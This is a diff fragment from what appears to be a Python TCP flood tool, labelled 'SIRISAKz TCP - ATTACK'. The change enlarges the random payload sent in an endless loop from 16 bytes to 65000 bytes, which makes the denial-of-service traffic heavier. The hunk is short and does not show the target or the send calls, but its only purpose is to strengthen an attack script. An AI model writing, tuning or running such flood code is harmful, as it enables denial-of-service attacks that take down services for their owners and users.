@@ -22,7 +22,7 @@ times = time
 threads = method
 
 def tcpsirisakz():
-	data = random._urandom(16)
+	data = random._urandom(65000)
 	i = ("| SIRISAKz TCP - ATTACK | - ")
 	while True:
 		try:
